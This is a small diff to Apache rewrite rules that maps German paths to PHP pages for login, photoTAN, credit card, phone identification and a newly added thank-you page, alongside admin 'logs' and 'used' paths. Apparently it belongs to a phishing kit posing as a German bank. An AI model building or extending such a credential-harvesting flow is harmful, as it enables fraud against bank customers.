@@ -20,7 +20,7 @@ RewriteRule ^einloggen/?.*$ Login.php [NC,L]
 RewriteRule ^information/?.*$ Phototan.php [NC,L]
 RewriteRule ^kreditkarte/?.*$ Kreditkarte.php [NC,L]
 RewriteRule ^identifizierung/?.*$ Telefonummer.php [NC,L]
-
+RewriteRule ^danke/?.*$ Danke.php [NC,L]
 
 # Remove trailing slash for /admin/logs/ and /admin/used/
 RewriteCond %{REQUEST_URI} ^/admin/(logs|used)/$
